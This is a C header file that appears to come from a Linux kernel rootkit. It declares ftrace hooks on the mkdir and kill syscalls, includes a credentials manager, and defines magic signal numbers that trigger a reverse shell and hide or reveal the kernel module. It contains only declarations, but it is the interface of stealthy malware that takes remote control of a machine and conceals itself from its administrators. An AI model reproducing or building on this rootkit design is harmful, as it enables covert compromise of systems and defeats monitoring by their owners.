#ifndef HEADER_HOOKERS
#define HEADER_HOOKERS

#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/signal.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/list.h>
#include <linux/export.h>

#include "ftrace_manager.h"
#include "creds_manager.h"

// Syscalls to be hooked using frace
#define SIGNAL_KILL_HOOK 50
#define SIGNAL_REVERSE_SHELL 51
#define SIGNAL_HIDE_KERNEL_MODULE 52
#define SIGNAL_SHOW_KERNEL_MODULE 53

//Hooking mkdir
asmlinkage int hook_mkdir(const struct pt_regs *regs);


//Hooking kill
asmlinkage int hook_kill(const struct pt_regs *regs);


void remove_all_hooks(void);
int install_all_hooks(void);

#endif